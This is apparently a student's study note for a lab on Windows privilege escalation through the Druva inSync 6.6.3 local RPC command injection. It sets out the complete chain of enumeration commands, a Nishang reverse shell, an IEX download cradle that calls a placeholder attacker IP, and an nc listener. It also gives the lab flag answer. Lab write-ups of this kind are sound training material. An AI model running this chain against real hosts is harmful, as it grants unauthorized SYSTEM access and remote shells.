# NOTE — Vulnerable Services

## ID
553

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 19 — Vulnerable Services

## Description
Covers privilege escalation via vulnerable third-party services, specifically exploiting Druva inSync 6.6.3's exposed RPC service (command injection on localhost port 6064) to achieve SYSTEM-level code execution.

## Tags
vulnerable-services, druva-insync, rpc, command-injection, privilege-escalation, windows

## Commands
- `wmic product get name`
- `netstat -ano | findstr 6064`
- `get-process -Id <PID>`
- `get-service | ? {$_.DisplayName -like 'Druva*'}`
- `notepad C:\Tools\Druva.ps1`
- `.\Druva.ps1`

## What This Section Covers
Even fully patched Windows systems can be escalated if vulnerable third-party software is installed. The Druva inSync 6.6.3 backup client runs a service as NT AUTHORITY\SYSTEM and exposes an RPC interface on localhost port 6064. A command injection flaw in this RPC service allows any local user to execute arbitrary commands as SYSTEM by sending a crafted socket message. This section demonstrates the full enumeration-to-exploitation chain using a PowerShell PoC.

## Background Theory

### Why Third-Party Services Matter
Windows services run in the background and often execute as SYSTEM. When third-party vendors install services with elevated privileges and expose interfaces (RPC, named pipes, local TCP ports), any vulnerability in that interface becomes a direct path to SYSTEM. Unlike kernel exploits, these don't depend on missing OS patches — the vulnerability is in the application itself.

### Druva inSync Vulnerability Details
Druva inSync is an enterprise backup, eDiscovery, and compliance monitoring tool. Version 6.6.3 has a command injection vulnerability in its local RPC service:

- The client service (`inSyncCPHwnet64`) listens on `127.0.0.1:6064`
- It runs as `NT AUTHORITY\SYSTEM`
- The RPC interface accepts commands without proper authentication or input validation
- The PoC exploits a path traversal (`C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`) to break out of the expected command context and execute arbitrary commands

### The PoC Breakdown
The PowerShell exploit does the following:
1. Opens a TCP socket to `127.0.0.1:6064`
2. Sends the RPC protocol header: `inSync PHC RPCW[v0002]`
3. Sends the RPC type bytes
4. Sends the command length followed by the command itself
5. The command uses path traversal to reach `cmd.exe` and execute the `$cmd` variable contents as SYSTEM

## Methodology
1. Enumerate installed software: `wmic product get name` — look for anything unusual or known-vulnerable
2. Google the application + version for known CVEs or exploit PoCs
3. Confirm the service is running: `netstat -ano | findstr 6064` to find the PID
4. Map PID to process: `get-process -Id <PID>` — confirms `inSyncCPHwnet64`
5. Double-check service status: `get-service | ? {$_.DisplayName -like 'Druva*'}`
6. On Pwnbox, download and prepare `Invoke-PowerShellTcp.ps1` as `shell.ps1`, append the callback line at the bottom
7. Host `shell.ps1` with `python3 -m http.server 8080`
8. Edit `Druva.ps1` on target to set `$cmd` to download and execute `shell.ps1` in memory
9. Start `nc -lvnp 9443` on Pwnbox
10. Run `.\Druva.ps1` on target — receive SYSTEM shell

## Multi-step Workflow
```
# Pwnbox — prepare the reverse shell script
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O shell.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <YOURIP> -Port 9443' >> shell.ps1

# Pwnbox — host it
python3 -m http.server 8080

# Pwnbox — new terminal, start listener
nc -lvnp 9443

# Target — edit Druva.ps1 to set $cmd:
# $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<YOURIP>:8080/shell.ps1')"
notepad C:\Tools\Druva.ps1

# Target (PowerShell from C:\Tools) — run exploit
.\Druva.ps1

# SYSTEM shell — read flag
type C:\Users\Administrator\Desktop\VulServices\flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — flag in VulServices folder on Admin Desktop | `Aud1t_th0se_th1rd_paRty_s3rvices!` | Druva inSync RPC command injection → IEX reverse shell → SYSTEM → `type` flag |

## Key Takeaways
- **Always enumerate installed software** — `wmic product get name` is one of the first commands to run after landing on a Windows host. Third-party apps are often the weakest link.
- **Local-only services still matter** — Druva inSync only listens on `127.0.0.1:6064`, so it's not remotely exploitable, but once you have any local access it's game over.
- **IEX (Invoke-Expression) cradle** — `IEX(New-Object Net.Webclient).downloadString('http://...')` downloads and executes a PowerShell script entirely in memory, leaving no file on disk. This is a core technique for fileless execution.
- **Nishang's Invoke-PowerShellTcp.ps1** is a reliable pure-PowerShell reverse shell — no msfvenom or Metasploit needed. Append the call line at the bottom of the script so it auto-executes when loaded via IEX.
- **The path traversal pattern** (`C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`) breaks out of the application's expected directory to reach system binaries — a common technique in command injection exploits where the base path is restricted.

## Gotchas
- **Edit the file, don't paste into the terminal** — the Druva.ps1 script needs the `$cmd` variable set before the socket code runs. Pasting individual lines into PowerShell will fail because the variables don't persist across separate executions.
- **Double-check your IP for typos** — `10.10.14.15.174` is not the same as `10.10.15.174`. One extra digit breaks everything.
- **Run `.\Druva.ps1` AFTER editing** — if you run it before changing `$cmd`, it executes the default command (usually `net user pwnd /add`), which is noisy and doesn't give you a shell.
- **The exploit outputs numbers** (like `22 4 4 316`) — these are byte counts from the socket `Send()` calls, not errors. Your shell arrives on the nc listener, not in the PowerShell window.
- **Execution policy is usually not a blocker** — if it's already Unrestricted, the `Set-ExecutionPolicy` error is cosmetic. Just run the script.
